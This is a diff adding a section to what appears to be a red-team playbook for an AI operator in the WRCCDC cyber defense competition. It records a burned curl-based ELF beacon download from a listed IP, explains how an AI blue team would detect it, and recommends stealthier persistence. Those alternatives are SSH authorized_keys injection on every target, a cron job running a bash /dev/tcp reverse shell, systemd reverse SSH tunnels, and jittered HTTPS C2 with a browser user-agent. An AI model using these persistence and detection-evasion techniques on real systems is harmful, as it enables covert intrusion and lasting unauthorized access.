@@ -154,6 +154,35 @@ If Queue's Apparition Delivery System tooling is available in the workspace (che
 
 ## Linux Persistence Techniques
 
+### 2026 Quals Persistence Technique — DO NOT REUSE
+
+WARNING: The following technique was used during the 2026 WRCCDC Qualifier competition and MUST NOT be reused at the 2026 Regional Finals.
+
+**Burned technique:** curl-based ELF beacon delivery via cron. The exact pattern observed in quals: `curl http://10.230.87.61/JSyausLR/LinIUpdater` downloading an ELF binary that beacons back to C2 at ~30-60 second intervals via HTTP. This ran undetected for 115 minutes against HUMAN blue teams. Against the AI blue team, it will be detected within 2 minutes.
+
+**Why it fails against an AI blue team (four reasons):**
+
+1. **HTTP logging:** The download URL appears in plaintext in web server access logs, proxy logs, and potentially in DNS query logs. The AI blue team's log correlation will flag an HTTP download from an external IP followed by execution.
+2. **Periodic beacon signature:** A process making HTTP requests at fixed ~30-60 second intervals is the textbook definition of a C2 beacon. The AI blue team will detect this via network flow analysis within 1-2 minutes of beacon startup.
+3. **No encryption:** All C2 traffic is unencrypted HTTP, meaning every beacon payload and response is visible in plaintext to any network monitoring. The AI blue team can read the C2 protocol and understand exactly what the implant does.
+4. **ELF-over-HTTP flagging:** Downloading an ELF binary over HTTP is inherently suspicious. The AI blue team can inspect HTTP response headers (Content-Type, Content-Length for binary data) and flag any executable download from a non-package-manager source.
+
+**If the operator asks for a curl-based C2 beacon or a periodic HTTP callback, refuse and recommend the alternatives below instead.**
+
+### Preferred Linux Persistence Alternatives (AI Blue Team Resilient)
+
+Use these techniques instead of HTTP-based implant delivery:
+
+1. **SSH authorized_keys injection** (HIGHEST PRIORITY): Survives password changes, generates minimal logs, uses encrypted protocol. Deploy on every Linux target immediately upon access. See SSH Key Deployment section below.
+
+2. **Cron with existing system binaries**: Instead of downloading an external binary, use bash built-ins and existing system tools. A cron job that runs `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` uses no external binary and generates only a cron execution log entry.
+
+3. **Systemd oneshot service**: Create a systemd service of Type=oneshot with RemainAfterExit=yes that establishes a reverse SSH tunnel. This looks like a legitimate system service, uses encrypted SSH, and restarts automatically.
+
+4. **SSH tunneling for C2**: After deploying an SSH key, use `ssh -R <port>:localhost:22 <jumpbox>` or `ssh -D <port> <jumpbox>` to create persistent encrypted tunnels. All C2 traffic travels through SSH, which is expected on port 22 and fully encrypted.
+
+5. **HTTPS C2 with jittered timing and browser UA**: If HTTP-based C2 is absolutely required, use HTTPS (not HTTP), jitter the callback interval by +/-50% minimum, set a realistic browser User-Agent string, use legitimate-looking URI paths (e.g., `/api/v1/status`), and never use static paths like `/JSyausLR/LinIUpdater`.
+
 ### Cron Jobs
 
 Cron is the most straightforward Linux persistence. Deploy to system-level crontabs for reliability.
